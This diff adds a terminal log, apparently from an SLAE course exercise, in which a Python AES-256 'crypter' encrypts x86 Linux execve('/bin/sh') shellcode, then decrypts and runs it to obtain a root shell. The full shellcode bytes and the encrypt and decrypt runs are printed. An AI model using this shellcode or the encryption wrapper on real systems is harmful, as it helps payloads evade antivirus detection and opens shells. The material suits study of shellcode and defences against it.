@@ -1,0 +1,29 @@
+root@kali:~/slae_crypter# python3 encrypt.py -k "secret" -s "\\x29\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x99\\x6a\\x0b\\x58\\xcd\\x80"
+Pycrypto AES-256 crypter
+
+provided key :	 secret 
+
+provided shellcode :	 \x29\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x99\x6a\x0b\x58\xcd\x80 
+
+encrypted shellcode :	 b'mY3byagSnODp3hjw219NkmjkvU1BWpWYFRyoSN1upEtt9pgd0XLneFUweIpgMrCK/uiUD0SbwyFUg6ciKLlrQUYMG/rzkZFzT/1/3yQb/7j3QX1WsMC/OE11nCE14ZEl8vK7aZriwePk7nGhzAm6ig=='
+
+
+root@kali:~/slae_crypter# python3 decrypt.py -k "secret" -e "Ape8yDPlJg1QIK2x12Q6OlPVSIH29puCp/fViVXSfqFAzW3lycav8prlJR0T1Te7qs7SifLnMnYXKRLAxgl8Ar2ugV2hD2ymQh2Vgmm+v73UP2Ylqc+AGcmnN2h746SbjOFMpBALsRYzeqXiLO2qGA=="
+Pycrypto AES-256 crypter
+
+test...
+ b'Ape8yDPlJg1QIK2x12Q6OlPVSIH29puCp/fViVXSfqFAzW3lycav8prlJR0T1Te7qs7SifLnMnYXKRLAxgl8Ar2ugV2hD2ymQh2Vgmm+v73UP2Ylqc+AGcmnN2h746SbjOFMpBALsRYzeqXiLO2qGA=='
+provided key :	 secret 
+
+encoded shellcode :	 b'Ape8yDPlJg1QIK2x12Q6OlPVSIH29puCp/fViVXSfqFAzW3lycav8prlJR0T1Te7qs7SifLnMnYXKRLAxgl8Ar2ugV2hD2ymQh2Vgmm+v73UP2Ylqc+AGcmnN2h746SbjOFMpBALsRYzeqXiLO2qGA==' 
+
+decoded shellcode....
+
+\x29\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x99\x6a\x0b\x58\xcd\x80
+b')\xc0Ph//shh/bin\x89\xe3\x89\xc1\x99j\x0bX\xcd\x80'
+# 
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
